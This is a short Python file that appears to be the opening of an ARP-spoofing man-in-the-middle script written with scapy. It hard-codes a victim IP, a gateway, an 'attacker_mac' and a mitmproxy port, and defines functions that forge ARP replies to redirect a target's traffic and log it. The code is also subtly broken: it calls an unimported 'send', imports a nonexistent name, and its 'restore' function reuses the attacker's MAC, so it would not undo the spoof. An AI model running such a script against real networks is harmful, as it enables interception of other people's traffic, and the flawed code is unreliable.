from scapy.all import ARP, Ether, sndp, sendp, sniff, conf, srp, IP, TCP, sr1, DNS, DNSQR
import time
import sys
import threading
import os
import subprocess
import datetime
import requests

conf.verb = 0

interface = "wlo1"
gateway_ip = "10.30.0.1"
target_ip = "10.30.9.15"
attacker_mac = "00:00:00:00:00:01" 
mitmproxy_port = 8080

def log_to_file(message):
    with open("traffic_log.txt", "a") as f:
        f.write(f"{datetime.datetime.now()}: {message}\n")
        
def spoof(target_ip, target_mac, gateway_ip):
    packet = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    send(packet, verbose=False)
def restore(destination_ip, source_ip):
    packet = ARP(op=2, psrc=source_ip, pdst=destination_ip, hwsrc=attacker_mac)
    send(packet, verbose=False)